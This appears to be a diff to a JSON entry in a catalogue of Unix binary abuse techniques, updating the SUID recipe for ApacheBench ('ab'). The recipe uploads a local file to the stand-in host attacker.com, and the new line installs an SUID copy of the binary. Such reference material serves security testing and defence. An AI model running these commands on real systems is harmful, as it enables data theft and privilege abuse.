@@ -15,7 +15,7 @@
     "suid": [
       {
         "description": "Upload local file via HTTP POST request.",
-        "code": "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
+        "code": "sudo install -m =xs $(which ab) .\nURL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
       }
     ],
     "sudo": [
